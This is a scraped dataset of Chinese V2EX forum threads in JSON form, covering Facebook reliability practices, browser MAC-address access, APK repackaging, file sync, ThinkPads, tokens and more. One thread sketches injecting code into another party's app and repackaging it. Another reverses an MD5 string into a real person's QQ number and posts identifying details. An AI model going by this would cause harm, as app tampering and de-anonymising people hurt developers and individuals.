同事们都看得到我付出, 都替我打抱不平, 难道领导是真的眼瞎么...\r", "一年前刚来到这里, 我是充满希望的, 想不到如此黑暗.", " #16 很多时候不是看不到你的付出,是他们也很难,觉得人太多又不好意思花大价钱开除.所以只能这样让你自己辞职. ", " "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>作者介绍： Ben Maurer 是 Facebook 的网络基础团队的技术领先者，主要负责整个 Facebook 面向用户产品的性能和可靠性。 Ben 于 2010 年正式加入 Facebook ，基础设施团队的成员。在加入 Facebook 之前，他与 Luis von Ahn 共同创立的验证码。最近，本与美国数字服务公司合作，以改进在联邦政府的技术使用。</p>\n<p><a href=\"https://www.shurenyun.com/\" rel=\"nofollow\">数人云</a>今天为大家带来一篇 Ben Maurer 分享的“ Facebook 面对大规模系统工程故障排查实践”，由于内容较多，所以<a href=\"https://www.shurenyun.com/\" rel=\"nofollow\">数人云</a>今天只为大家带来上半部分，后续内容会在明天发布！</p>\n<p>故障是任何大规模工程系统的一部分。 Facebook 的文化价值之一就是拥抱失败。这可以从挂在门洛帕克总部墙上的海报上得到体现：“如果你无所畏惧，你会怎样？”“天佑勇者。”</p>\n<p>为了使 Facebook 的系统在快速变化的情况下保持可靠，专门为其研究了常见的故障模式，并建立抽象理念来解决这些问题。这些理念确保最佳实践应用于的整个基础设施。通过建立工具来诊断问题，并创建一种复盘事故的文化来推动并作出改进，防止未来发生故障。</p>\n<h2>为什么会发生故障？</h2>\n<p>虽然每一个故障都有一个独特的故事，但是多数故障都可以归结为少数的原因。</p>\n<h3>个别机器故障</h3>\n<p>单个机器通常会遇到一个孤立的故障，不会影响基础设施的其余部分。例如，可能一台机器的硬盘驱动器发生了故障，或者某台机器上的服务遇到了代码中的错误，内存损坏或等。</p>\n<p>避免单个机器故障的关键是自动化，自动化工作最好结合已知的故障模式（如硬盘驱动器的 S.M.A.R.T.错误）与未知问题的搜索（例如，通过交换服务器异常缓慢的响应时间）。当自动化发现一个未知问题，手工调查可以帮助开发更好的工具来检测和修复问题。</p>\n<h3>合理工作负荷的变化</h3>\n<p>遇到突发状况， Facebook 会改变日常的行为习惯，为基础设施带来挑战。例如，在重要的全球事件中，独特的工作负载可能会以不寻常的方式来考验其中的基础设施。当奥巴马赢得 2008 美国总统大选时， Facebook 页面活跃度刷新了记录。如超级杯或者世界杯这样重大的体育赛事也会引发其发帖数量大大增加。负载测试，包括“灰度发布”即有新功能发布，但是对于使用者不可见，有助于确保新功能能够处理负载。</p>\n<p>在这些事件中收集的统计数据常常为系统的设计提供一个独特的视角。通常情况下，重大事件导致用户行为的变化（例如，通过围绕一个特定的对象创建主题活动）。有关这些更改的数据通常指向设计决策，以便在后续事件中允许更平滑的操作。</p>\n<h3>人为失误</h3>\n<p>鉴于 Facebook 鼓励工程师“快速行动，打破常规”-如同装饰办公室的另一个海报所示，也许有人会认为，很多错误都是人为造成的。根据数据表明，人为失误是失败的一个因素。图 1 涵盖了严重到足以被认为违反了 SLA （服务水平协议）的事件的时间节点数据。由于目标是很严格的，所以对网站用户而言大多数事件是轻微的，不明显的。图 1a 显示事件在星期六和星期日发生的概率大幅减少，然而也不会影响网站流量。图 1b 显示 6 个月的时间只有两周没有事件：包括圣诞节的一周和员工写互评的一周。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/kQYDHqx4.png\"></p>\n<p>这两个数据似乎表明，当 Facebook 的员工因为忙于其它事情（如周末、节假日以及员工考核等）而没有积极去改变基础设施的时候，网站的可靠性反而处于一个比较高的水平。导致我们相信这不是因为 Facebook 员工过于粗心，而是证明了基础设施在很大程度上是对非人为的错误进行自我修复，如机器故障。</p>\n<h2>三种容易导致事故的原因</h2>\n<p>虽然事故有不同的产生原因，但是通过总结发现，有三种常见的原因会使故障扩大并成为大规模的问题。对于每一个成因，都应制定相应的预防措施，以减轻大规模事故。</p>\n<h3>快速部署配置更改</h3>\n<p>配置系统往往被设计为能在全球范围内迅速复制更改。 Rapid 配置更改是一个功能强大的工具，可以让工程师快速管理新产品的推出或调整设置。然而，快速配置也意味着当配置不当时会快速引发故障。我们采取了一些方法来防止配置更改导致故障。</p>\n<ul>\n<li>让每个人都使用一个通用的配置系统</li>\n</ul>\n<p>使用通用配置系统可以确保程序和工具适用于所有类型的配置。在 Facebook ，我们发现团队有时会试图以一次性的方式来进行配置。避免使用这种方式而采用一种统一的方式来进行配置，从而使配置系统成为一种提高站点可靠性的衡量方法。</p>\n<ul>\n<li>静态验证配置更改</li>\n</ul>\n<p>许多配置系统允许松散类型的配置，如 JSON 结构。这些类型的配置很容易使工程师犯一些低级错误，例如敲错字段，如果这个字段是必须使用整数的字符串。对于这种类型的错误最好的办法就是使用静态验证。一个结构化的格式（例如，在 Facebook 使用的 Thrift ）可以提供最基本的验证。然而，编写验证程序来验证更详细的要求也是合理的。</p>\n<ul>\n<li>运行一个 Canary</li>\n</ul>\n<p>首先将配置部署到服务的小范围，可以防止灾难性的更改。一个 Canary 可以采取多种形式。最明显的是 A / B 测试，如只对百分之一的用户推出一个新的配置。多个 A / B 测试可以同时运行，并且可以使用数据随时间进度来跟踪度量。</p>\n<p>然而，对于可靠性的目的， A / B 测试不满足我们的所有需求。一个更改部署给少数用户，但导致了服务器崩溃或内存耗尽的变化，显然会产生超出测试的有限用户的影响。 A / B 测试也费时。工程师们常常希望在没有使用 A / B 测试的情况下推出一些微小的变化。为此， Facebook 基础设施自动测试新配置的一小部分服务器。例如，如果我们希望部署一个新的 A / B 测试给百分之一的用户，首先部署测试在仅影响很少量服务器的那部分用户，在一个很短的时间内监测这些服务器，以确保他们不会崩溃或有其他很明显的问题。这种机制提供了一个适用于所有变更的基本的“健全检查”以确保它们不会造成大面积的故障。</p>\n<ul>\n<li>保持良好的配置</li>\n</ul>\n<p>Facebook 的配置系统的设计是尽量确保当更新带来故障时保持良好的配置。开发人员希望创建的配置系统当接收到无效的更新配置时会崩溃。喜欢在这些类型的情况下保留旧的配置，并向系统操作员发出警报，说明该配置无法更新。继续运行旧有的配置通常优于将错误返回给用户。</p>\n<ul>\n<li>使它容易恢复</li>\n</ul>\n<p>有时，尽管尽了最大努力，部署的配置依然有问题，快速查找和恢复是解决这类问题的关键，配置系统是由版本控制，这使得系统很容易恢复。</p>\n<h3>核心服务的硬依赖</h3>\n<p>开发者通常默认配置管理，服务发现，存储系统等核心业务永远不会发生故障。可是，这些核心业务的轻微故障都会引起大面积的事故发生。</p>\n<ul>\n<li>核心服务的缓存数据</li>\n</ul>\n<p>依赖于这些类型的服务通常是不必要的，可以通过缓存数据的方式，以此保证其中一个系统短暂性中断，而其它服务依旧继续运行。</p>\n<ul>\n<li>提供硬化的 API 使用核心服务</li>\n</ul>\n<p>核心服务是最好的补充公共库，遵循最佳实践来使用这些核心服务。例如，库可以提供良好的 api 来管理缓存或处理故障。</p>\n<ul>\n<li>运行的消防演习</li>\n</ul>\n<p>你可能认为能够在核心服务中断中生存下来，在尝试之前，你永远不会知道。对于这些类型的中断，我们不得不开发系统的消防演习，从故障注入系统应用到单个服务器中，以此手动触发整个数据中心的中断。</p>\n<h3>增加延迟和资源耗尽</h3>\n<p>一些故障导致服务的延迟增加到客户端。这种增加的延迟可能很少（例如，考虑到一个人的配置错误，但是依旧服务的能力导致 CPU 使用量增加），还有就是，它可能是无限的（一个服务线程服务响应陷入瘫痪）。而少量的延迟可以很容易地解决由 Facebook 的基础设施、大量的延迟会导致全面故障。几乎所有的服务对未完成请求的数量都有限制，这个限制可能是由于每个请求服务线程数量有限，也可能是由于基于故障服务中的内存有限。如果一个服务面临大量的延迟，那么调用它的服务将耗尽他们的资源。这种故障会通过许多层面进入系统服务中，导致系统故障的发生。</p>\n<p>资源枯竭是一个极具破坏性的故障模式，由于它允许服务请求的子集用于导致失败的所有请求失败。例如，一个服务调用只推出 1%的用户对新的实验服务，通常要求这个实验服务需要 1 毫秒，但由于在新的服务失败的请求需要 1 秒，所以 1%的用户使用这项新服务请求可能会消耗太多的线程，其他 99 ％用户就不能运行此线程。\n如今，我们已经发现了一些技术，可以避免这种类型的积累与较低的误报率。</p>\n<ul>\n<li>控制延迟</li>\n</ul>\n<p>在分析以往的事故延迟中，我们发现许多最糟糕的故障涉及大量队列等待处理的请求。有问题的服务有一个资源限制（如活动线程或内存的数量）和将缓冲请求以保持低于限制使用的请求。由于服务无法跟上传入请求的速度，队列会变得越来越大，直到它突破了应用程序定义的限制。为了解决这种情况，我们希望在不影响正常操作和保证可靠性的情况下，来限制队列的大小。我们研究了一个很相似的 bufferbloat ，在保证可靠性的同时，使用队列从而不会造成过度延迟。尝试了一种 codel1 （延时）控制算法：</p>\n<p>onNewRequest(req, queue):</p>\n<p>if(queue.lastEmptyTime() &lt; (now - N seconds)) {</p>\n<pre><code>timeout = M ms \n</code></pre>\n<p>} else {</p>\n<pre><code>timeout = N seconds; \n</code></pre>\n<p>}</p>\n<p>queue.enqueue(req, timeout)</p>\n<p>在该算法中，如果服务不能在最后 N 毫秒内清空队列，则队列中花费的时间仅限于 M 毫秒。如果服务能够在最后 N 毫秒内完成清空队列，则队列中所花费的时间仅限于 N 毫秒。该算法避免站在队列（由于 lastEmptyTime 将在遥远的过去,导致 anM-ms 排队超时），一次达到短时间的排队对于可靠性的目的。虽然它似乎有悖常理，请求时间较短，这个过程允许的迅速丢弃服务，而不是建立在系统无法跟上传入请求的服务。短的超时可确保服务器总是处在工作的状态，而不是空闲。</p>\n<p>该算法的一个吸引人的特性是， M 和 N 的值往往不需要调整。解决排队问题的其他方法，如在队列中设置项目的数量或设置队列的超时时间的限制，需要在每个服务基础上进行调整。我们已经发现， M 和 100 毫秒的值是 5 毫秒，它可以很好的用于 N 中。 Facebook 的开源码 library5 提供的算法是由 thrift4 框架实现。</p>\n<ul>\n<li>自适应后进先出（后进先出）</li>\n</ul>\n<p>大多数服务进程队列 FIFO （先进先出）。当处于高额度处理进程中时，先进命令明显已经运行了很长时间，以至于用户可能已经中止了生成请求的操作。当处理先进申请命令时，相比之下这种刚刚抵达的请求命令，首先会消耗少许可能益于用户的请求命令，服务进程请求程序使用的是应后进先出的方式。在正常工作条件下，要求按照先进先出的顺序进行处理，但是当一个队列正要开始成形时，服务器会切换为 LIFO 模式，这时， LIFO 和 CoDel 就可以很好的结合在一起，如图 2 所示。 CoDel 超时设置时，阻止长的计算机程序队列增长，然后具有适应性的先出后进命令在计算机程序队列设置新的请求模式，然后在数字信号编码器的作用下，他们两个能够发挥最大化的作用。 HHVM3 ， Facebook 的 PHP 运行时，自适应后进先出法的算法得以实现。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/1xi6O44u.png\"></p>\n<ul>\n<li>并发控制</li>\n</ul>\n<p>无论是编码和自适应的后进先出法都在服务器端运行。服务器通常是执行延迟的最好的措施——服务器更倾向于大量的客户同时能够拥有更多的客户信息。然而，有些故障是如此严重，以至于服务器端控件无法启动。为此，我们在客户端实施一种权宜之计。每个客户端会跟踪每个服务器所未完成的出站请求数量。当发送新请求时，如果对该服务的未执行请求的数目超过可配置的数字，则该请求将立即标记为错误。这种机制可防止单个服务垄断其客户端的资源。</p>\n<p>以上内容是<a href=\"https://www.shurenyun.com/\" rel=\"nofollow\">数人云</a>今天为大家带来的“ Facebook 面对大规模系统工程故障排查实践”的上半部分，其中主要涵盖导致故障的原因、以及可以使用一个通用的系统等相关内容，希望可以对大家有所帮助~明天还会为大家带来最终的解决方案哟，敬请期待~</p>\n<p>作者： Ben Maurer</p>\n<p>原文： Fail at Scale  Reliability in the face of rapid change</p>\n<p><a href=\"http://queue.acm.org/detail.cfm?id=2839461\" rel=\"nofollow\">http://queue.acm.org/detail.cfm?id=2839461</a></p>\n</div></div>"], "reply": "1", "tittle": "面对大规模系统工程，看 Facebook 如何处理故障排查(一）", "comment": ["支持，这就是干货"]},
{"content": ["<div class=\"topic_content\">内部局域网，谷歌浏览器。用户访问系统网站的时候，能不能通过安装插件然后获取 mac 地址上传给后台？</div>"], "reply": "5", "tittle": "有没有什么谷歌插件可以获取用户的 mac 地址？", "comment": ["扩展肯定不行，你可以看看 Chrome 应用，或许可以获取到系统层面的信息。", "没有这样的接口，作为服务通常也不可以获取用户的永久唯一识别信息。", "古老的时代， ie actvieX 空间实现，我做过，还要签名\r", "现在的 PPAPI 插件，代替 NPAPI\r", "所以你需要研究 PPAPI 插件，如果 ppapi 授予这个权限，你懂得……", "感觉就是不行吧 tcp forward 的时候 mac 会被换成 ap 的？", "内部局域网如果没经过路由器，服务器执行下 arp -a 可以获得 ip mac 映射关系"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>研究了一个礼拜，想在 apk 中添加个插件 jar 包\n那么多的 smali 文件，怎么添加这个插件呢？</p>\n</div></div>"], "reply": "15", "tittle": "apk 逆向，大神们有何高招？", "comment": ["灰产就安心做，别出来张扬，这里多少正八景做 app 的等着排队打死你呢", "哈哈....真萌新....", "1. 先插桩找点\r", "2. 找到入口注入相关调用（调用 jar ）\r", "3. 重新打包\r", "\r", "如果遇到完整性校验，需要做更多额外操作", " 到是想张扬，不会啊", " 对于我这个新手来说有点懵逼，感谢给我思路，已经很满足了", "看雪安全论坛，那边搞这个的多", " #2 嗯，上班了", "国内两大 APP 加密，爱加密和邦邦安全，让你完全不知道怎么逆向", "你来错地方了 应该去看雪问", "不要做非法的事情，你这样重打包人家的东西，不好哦。", " 软件服务商，不提供服务，不是 RMB 的问题，客户需要咋办？", "这个问题很简单，我可以做", " ，发联系方式到这里找我", " 你们这个服务商很有意思哦，客户提了需求接完了跑论坛上找方案，这比猪八戒还二手啊", " 如果我是 boos 我必定联系你"]},
{"content": ["<div class=\"topic_content\">有两台服务器都是 win03 （由于服务器上跑 asp 程序，所以没有 Linux ）\r<br>\r<br>一台主服务器 A ，另一外服务器 B\r<br>\r<br>想让他们服务器之间文件实时同步： 相当于 B 服务器是 A 服务器的镜像， A 是主服务器，所有的增删文件都在 A 服务器操作， B 服务器只负责实时同步 A 服务器上的数据即可。\r<br>\r<br>大婶们，有什么比较好的解决方案吗？ 本人新手</div>"], "reply": "11", "tittle": "win03 服务器之间有哪些文件同步工具？", "comment": ["resilio sync", "dropbox", "QQ", "good sync", "winscp", "FileGee ，之前用在生产环境，收费的。", "syncthing", "FreeFileSync", " 我也用这个", "  收费可以接受，但是好像有点贵了。~", " \r", " \r", " \r", " \r", " \r", " \r", " \r", "\r", "谢谢各位大婶们， 最后我选择了 FreeFileSync"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>discuzX 对接 django 用户中心 oauth2.0\n2 个用户中心怎么玩？自己修改 discuz?\n大神们有何高见？</p>\n</div></div>"], "reply": "10", "tittle": "个大前端，下达给我这个任务容易吗？", "comment": ["这不算是 SSO 么，这个也归前端管？", "这就是后端工作了吧，怎么就大前端了呢", "高估我了", "可以用 UCenter 插件", "写一个用户中间件服务，可以在后面同时带 django 和 oauth\r", "\r", "discuzX 直接和这个服务通讯", "没办法，大前端就要有大前端的样子", "discuz 开发个第三方登录插件就好，用 QQ 登录的插件改改就行。相当于用户中心用 django 的， discuz 用 django 的账号来第三方登录。", " 昨天看到微信登录的，没有下手，想看看大神们的看法，这个真的不错", "老早以前搞过 discuz ，它好像不是有个 ucenter ，负责整个系统的用户管理与接入", " 想笑：）"]},
{"content": ["<div class=\"topic_content\">论性价比脚踩神舟啊，美帝良心居然这么便宜？虽说是二手也太便宜了吧，还是说水太深？</div>"], "reply": "46", "tittle": "为啥某宝上的 Thinkpad 那么便宜啊！？", "comment": ["错觉，当然，代购的除外。", " 我说的是二手，包括但不限于 x220 230", "八通道 海淘", "二手的当然便宜，很多都是洋垃圾翻新组装的，你可以去闲鱼找个人卖家对比看看。", "机器内部的 cpu 不是原装的，很多是焊接的，价格差很多。性能也有差，但是软件参数上面看，没差别。", "二手的你拿什么官方比，毫无可比性。\r", "另外，去年下半年这种二手洋垃圾比现在还要便宜。", "我司用的都是二手的 x220 （现在入职的也是配这款）， 大概两千多吧（换成 SSD ）。我倒是觉得性价比蛮高的。", "一般是国外公司租 4 年后退下来的，一般原价的 1/3 ，", "这种二手靠谱吗？", "别以为自己淘到好货, 居然捡到便宜了, 万一是个坑呢", "洋垃圾组装货。。。技术一般不咋地，有点松松的感觉。总会有点小瑕疵的。\r", "外壳一般都被喷漆过，很批量化的感觉。\r", "应该是个小产业了。\r", "\r", "2 千 600 多 i7 3720qm+高分屏+8g ， 256g ，感觉内存硬盘应该是杂牌，所谓高分屏也只是 1600x900 而已。。。\r", "有 3 大件保修 1 年，到手 7 天内不喜欢可以退。\r", "\r", "给员工用挺合适，但是自己用就有点对不起自己了。。。", "4 、 5 年前的产品，如今价格是上市价的 1/5-1/3 难道不正常？", "  能手焊一个 cpu ？？？！", " BGA 转 PGA", " 他估计说的是 cpu 的针脚， bga 植针变 pga 。不过楼主说的，就 tp 的牌子现在二手不便宜难道还要买贵才行么？这也有个二手正常行情价啊，要是个别便宜的太多的东西，那不是坑才怪", "国外电子产品报废过海关\r", "昆山换壳\r", "\r", "二手的你怎么能拿来对比新机？", "水太深了,别买\r", "\r", "都特么什么垃圾硬件啊!\r", "\r", "内存坏道 1000 多  硬盘坏道 3000 屏幕有一片亮点\r", "\r", "这就是我在淘宝买到的二手机器....", " 神州性价比已经很高了， Thinkpad 型号老点都是洋垃圾，便宜很正常，成本低", "為啥突然都聊起 thinkpad ，某寶這個不是一直很便宜麼⋯⋯", "组装货和翻新垃圾", "很多翻新机", "肯定靠谱的，不过官方为了让你花大钱买新机会四下散布淘宝上代购的都是二手货的假消息", "不要买，多半是洋垃圾组装\r", "我爸就被骗过", "科普一个知识...洋垃圾....\r", "买这种东西基本看人品...例如我一个同学...花 1k 买的 thinkpad(刚出的那会票价 1w 左右,当然 1k 的价格已经过了好几年了..) 用了 3 年..\r", "\r", ".也有人..用了几天就坏了..", "用了 4 年了 除了一次女人把面汤打翻在键盘了换过一次键盘...依然刚健无比", "洋垃圾 ，收手机比较多", "并不是良心，是奸商\r", "你根本不知道这样的笔记本的配件是哪来的，在什么车间里，用什么方式组装的，当然能用多久也不好说\r", "大概也不太可能像 51nb 那些 X61 一样战十年吧", "翻新 Thinkpad 这个产业至少可依追溯到 2000 年", "二手 TP 还是论坛略微靠谱一些吧，确实有很多货源是企业淘汰下来的，但是淘宝人肉混杂，难说", "可怜大神船，性价比要战洋垃圾 233", "洋垃圾不能乱捡...", "有多种渠道的货，垃圾组装的也很多，好一点的是国外企业保修到期后批量退下来的，因为人工成本高所以保修到期了就换新的了，退下来之后搞到深圳，论关系好坏、大户小户依次挑的，有很多成色很好的都前边搞走了， 后边那些外壳划痕损坏严重的就翻新 AB 壳，认识那些老板的话都会和你说的。", "组装的啊", "真心看来货渠道，最好 的就是大型企业批量报废的，一般都是没问题的，", "买过一些洋垃圾，确实都不错。运气好。", "用了 3 年 X201 ，依然坚挺", " \r", "买过两次洋垃圾小黑，非常满意，副作用就是买新本时候总觉得肉痛下不去手。正常二手啥价钱你就买啥价钱，只要别买那种便宜到夸张的没什么问题，国外大企业都是向 IT 服务公司租机器，隔几年就要淘汰一批，这种大批量的机器肯定比从个人手里买二手机靠谱多了，个人二手机的使用环境、习惯差别很大，买这个如果不是特别懂硬件就是拼 rp 了。", "组装机嘛……很正常\r", "哪有真二手", " \r", "学习了\r", "因为我自己买洋垃圾 /二手的经历并不怎么愉快，所以对二手电子产品并不是很放心\r", "如果有这种大批量淘汰货源的话应该会靠谱一些", "组装的二手小黑其实很不错的，就是喷漆以后的外壳容易粘灰，自己拆机维修升级也很方便， X220 这种绝版键盘可以一直使用下去了，配件 X 宝上也很多，适合喜欢折腾的。", " 老兄客气，可能运气比较好，找到的是论坛里信誉比较好的老店，容易中刀的硬盘也换了自己的 ssd 。", "其實有些配置計算下也不是那麼便宜啊！但花多少錢辦多少事兒。\r", "\r", "水深不深? 恐怕這只有賣家才知道实情吧，買的沒有賣的精；\r", "如果是碰到有良心的賣家，那也是自己運氣好！", "2014 年买过个拼装的 X220 。用了 1 年，主板坏了，买了个 300 快的二手主板，换上，现在一直在用。性价比很高。", "去专门网看看。。。。 51NB", "怎么断定是洋垃圾，官网能查到保修的也是吗"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>偶然看到的一个妹子的联系方式</p>\n<p>9c478c263c8e3f3db42149b958a7085c</p>\n<p>请教下知道的大大</p>\n</div></div>"], "reply": "26", "tittle": "这是什么加密算法", "comment": ["md5 。", "貌似并不是妹子。。。\r", "\r", "在 ", " 这个页面看到了你说的联系方式；\r", "\r", "域名 whois 无果；\r", "\r", "下面有个 QQ 群 566308505 ，查了一下看到群主的 QQ 是 68894006 ，头像正好就是上面那个博客的头像，昵称也是博客的域名 Viosey ；\r", "\r", "把 QQ 号码 68894006 md5 之后就是 9c478c263c8e3f3db42149b958a7085c ；\r", "\r", "然而性别是男的。。", " 你是怎么判断的呢 ，还是猜的？", "哈哈 楼上 nice", " 哈哈", " 32 位 16 进制  最常见的就 md5 啊", "哈哈哈哈 楼上 nice", " 你对这个字符串好熟悉", "2 楼 正解。\r", "\r", "楼主想想一下，一个用着二次元妹子照片的抠脚大汉。", " 搜索引擎搜出来的。", "这明显是 md5 啊", " 百度一下也就一条结果，比大海捞针还容易", "查了下是 68894006 ，我是不是太无聊了", "顺便帮你 at 一下 @", " 这个 dalao 也在 V2 的", "我也好无聊： 68894006", " ", "是不是把 女 或者 women 之类的当作盐加进去了？😂", "搞笑么, md5 是 hash 算法, 没法解密啊.  这么留联系方式怎么玩...\r", "当然, qq 只是一串数字, 已经穷举出来了.", "MD5 😂", "然而并不是妹纸。\r", "头像是「夏目贵志」是个男生，来自动漫「夏目友人帐」", "233 正主", " 啊哈，你不应该查 Whois 的。\r", "首先， ", " 域名是在国外买的，多半都会启用域名隐私保护。\r", "但是你如果 ping 一下 ", " ，你会发现是腾讯云主机，而且 ", " 用了又拍云 CDN （看侧边栏下面那个又拍云的 svg 格式 logo 就知道了）。\r", "所以这个域名肯定有备案。你应该查备案信息。\r", "\r", "至于下面那个 Q 群，是 hexo-theme-material 和 typecho-theme-material 的官方群。群主 viosey 嘛，是这两个主题的开发者。", " 你不觉得 whois 是最快捷的方式么… 不 whois 能知道域名是哪里买的？我又不像你一样认识这人", " 很多妹子资料都是男的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>小公司的苦逼 iOS 开发+测试+维护，接到了一个三哥的外包项目，签了 NDA ，需求文档就不截图了，大致说一下问题。</p>\n<p>他们需要一个像下面这样的手机壳，手机壳上面有 LED 灯，通过 USB 口接到手机，有专门的念经的 App ，他们希望打开 App 后，正屏滚动显示经文，手机外响播放念诵的 BGM ，然后手机壳上的 LED 灯亮起。\n<br>\n<img src=\"http://wx4.sinaimg.cn/large/005Gcprogy1fe51wsbzh3j30c00hm7hr.jpg\">\n<br>\n<img src=\"http://wx2.sinaimg.cn/large/005Gcprogy1fe520eh8h8j30c00hmwfn.jpg\">\n<br>\n<img src=\"http://wx2.sinaimg.cn/large/005Gcprogy1fe51xk3cn1j30c00hm0ts.jpg\"></p>\n<p>Android 版本已经由 Android 开发完成，没费什么事。现在轮到 iOS 了，唉，看着就想逃啊～～～</p>\n<p>问题 1 ：苹果对 Lightning 接口的操作有很严格的限制，我们给他们的答复是，应该使用苹果的 Lightning 芯片，然后走 MFi 认证流程。三哥对成本扣的很死，他们认为不需要用 Lightning 协议通信，只是简单的开关 LED 电源，不需要这个芯片，想把芯片这一块的 BOM 成本省掉。这个貌似应该行不通的，苹果不会让你这样乱搞的吧。。。我们已经跟三哥说了，这样肯定过不了 MFi ， App 审核也估计过不了，三哥对成本这一块比较执着，请问有什么更好的理由能给他怼回去。</p>\n<p>问题 2 ：那个 Lightning 芯片的成本大概在 2 美金不到的样子，即使用了这个芯片，这种 App 因为含有宗教色彩，而且三哥的 Demo 里面还有一个欢喜佛（不懂的自行百度）的图片，这种 App 的审核是不是会各种悲剧啊。。。</p>\n<p>小白真心跪求各位有经验的 iOS 大神指点。</p>\n</div></div>"], "reply": "44", "tittle": "来围观一下三哥的奇葩需求吧～", "comment": ["不知道排版怎么突然就乱了。。。 Edit 之后还这样。。。 对不起观众老爷们了", "用 3.5 ？可惜 iphone7", "或者加个 esp8266 。不知道有没有更低成本的做法", "牛了👃了，哈哈", "外壳独立供电，用蓝牙吧。", "用蓝牙串口就是了", "蓝牙", "  Android 版本没有用任何芯片，是直接接的 USB 口，软件调用了 SDK 的 UsbDeviceConnection 初始化了一个 UsbConnection ，需要亮灯的时候调用 bulkTransfer 函数占用 USB 口，持续给高电压灯就亮了。", " \r", " \r", " \r", "加上电池，蓝牙部分，成本会不会比 MFi 还高？", " 外壳独立供电是啥意思？不从手机 USB 口 /Lightning 口取电，手机壳自带电池？\r", "\r", "\r", " \r", "蓝牙可以用来控制开关，但是软件做起来也不容易， App 开启的时候要申请蓝牙权限吧。而且手机壳也要嵌入一个蓝牙芯片，这个三哥很难同意的。\r", "\r", " \r", "不太明白蓝牙串口是什么意思， iPhone 能把 Lightning 当串口用么？", "上芯片模拟 HID ，或者盘", "不错啊，把上面的佛像改成中国的，肯定能卖", "这需求 NB", "哈哈哈哈，我只想笑。", " 肯定火。而且提供在线供养，支持微信、支付宝直接支付", "感觉这能笑一年", "做好 demo 可以卖个来么。哈哈", "淘宝 1.9 包邮的 Lightning 数据线里的芯片是怎么来的？", "去年段子上火那会儿，我想到了个在线服务：云放生", "3 。 5 吧还是。", "233", "三哥竟然还把活外包出去……", "耳机能用吗？", "学手机风扇那样，用 Lightning 接口拿电，然后在手机壳上加个开关，用户要用的时候就自己开...\r", "\r", "好吧，感觉不太符合需求，不过能劝服对方的话这个貌似成本很低...", "g", "Lightning 只有供电，用蓝牙传输音乐？", " 我也觉得很神奇... 一般是国内公司把需求外包给印度公司，现在竟然翻过来了。", "把外壳本身做成电池，顺便还能给手机充电啥的……", "绑个充电宝一起卖出去， USB 接口都不用改了。", "用耳机接口", "这个做出来记得发淘宝链接，我要买一个，这外壳看着就洋气🤣🤣🤣", "这有啥难怼的，直接让他们找同胞自己写啊", " \r", "就点几个 LED ，外壳上弄个小电池能用很久。\r", "担心蓝牙要权限的话，换个思路，从音频口传控制信号试试。\r", "\r", "再开开脑洞：诵经音频一头一尾混入两个特别的超声波信号，外壳接收超声波信号开关 LED 。", " 阿三硬件不行，没有华强北，价格做不下去。", "牛逼.. 还能接到三哥的单!", "走音频通道？", "耳机口应该不太行， ip7 都阉割掉了（滑稽\r", "lighting 接口只取电的话，鉴于有那种 lighting 小风扇感觉应该成本不会太高；或者用外置纽扣电池我觉得也可行。\r", "但是通讯是个问题，去掉 lighting 接口通讯的可能性的话，按我想大概有这么几种方案。\r", "* @", " 提到的超声波信号方案。\r", "* 可以弄个光感在闪光灯附近，然后调用闪光灯通过频闪通讯。\r", "* 手机振动感应\r", "* 手动硬件开关\r", "* 电磁波感应（有那种接受电话短信能发光的手机挂坠，原理类似）", " MFI 没了解过 蓝牙已经烂大街了 刷新了我以往的认知 你可以看下淘宝\r", "\r", " 走蓝牙的串口 也有走 wifi 的", "走企业证书不上架就好了，难道三哥还在乎多花 199 刀么，哈哈哈哈哈😄\r", "\r", "linght 口通信都能做到，供电应该不难吧？ ", "  哈哈哈😄", " 用耳机孔", " 果然厉害。。", "NDA 白签了", "\r", "\r", "\r", "蓝牙芯片应该便宜，关键是壳子厚度有限， LED 用的那种贴片的，基本上不占空间。如果上电池，再上个 PCB ，厚度肯定不行，况且蓝牙还要申请权限，如果用户把蓝牙关了就玩不转。\r", "\r", "\r", "Android 就是这样搞的，还可以。\r", "\r", "\r", "\r", "\r", " \r", "恩，我请示下老板，看能不能给搞几个样品出来，当然是私下的了。\r", "\r", "\r", "\r", "\r", "\r", " \r", "三哥的硬件根本玩不转，我们 Android 的软硬件 demo 出来一周时间都不到，三哥当时在视频会议里就惊了！兲朝这点还是很不错的，什么东西打打电话就能帮你弄好，不行还可以上马云家逛逛。\r", "三哥的软件其实也不行，有好多功能都是做的样子货，仔细玩玩一堆 bug ，关键是三哥英语溜，能忽悠，了解欧美的那一套软件流程。\r", "\r", "\r", "\r", " \r", "\r", "\r", "耳机貌似不行，播放经文 BGM 要用外响， iPhone 好像插上耳机，外响就默认关闭了，不知道有没有什么方法破。跪求。", "先把 android 部分的钱收了，后面怎么都好说（后面告诉到哪都只有这一种方案，不接受就另请高明"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前一直在写 iOS ，前后端分离，每次请求带上 token 就行了。</p>\n<p>现在想写一下后端，想问一下一般是怎么处理 token 的？</p>\n<p>用户登录的时候根据 userID 加上时间戳 或者 加上一个自定义值 用加密算法生成 token 之后，</p>\n<p>1.存到数据库中（能设置过期时间吗？），每次客户端请求的时候取出来验证</p>\n<p>2.存到 redis 中，设置过期时间，每次客户端请求的时候取出来验证</p>\n<p>3.不存，每次客户端请求的时候根据之前的生成方法再生成一次来验证</p>\n<p>哪种方法成本更低？ 或者有更好的方法吗？</p>\n</div></div>", "<div class=\"topic_content\">感觉大家的回复。\r<br>\r<br>和一些后台程序员也讨论了一下，很多都是不存，即用 JWT\r<br>\r<br><a target=\"_blank\" href=\"https://jwt.io/\" rel=\"nofollow\">https://jwt.io/</a>\r<br>\r<br>目前已经有很多语言的库都支持了。</div>"], "reply": "38", "tittle": "服务端一般怎么处理 token？", "comment": ["第三种能解释下吗", " 猜测应该是类似 jwt 那种吧。", " \r", "例如客户端登录后服务器生成 token 之后返回，之后客户端请求的时候带上这个 token ，服务端每次都根据之前生成的方法（例如加上了自定义值，使用了什么加密算法）再生成一次来比较，一样就验证成功\r", "就是楼上说的 JWT ，我也是刚接触", "我实现过的是不存，仅验证", 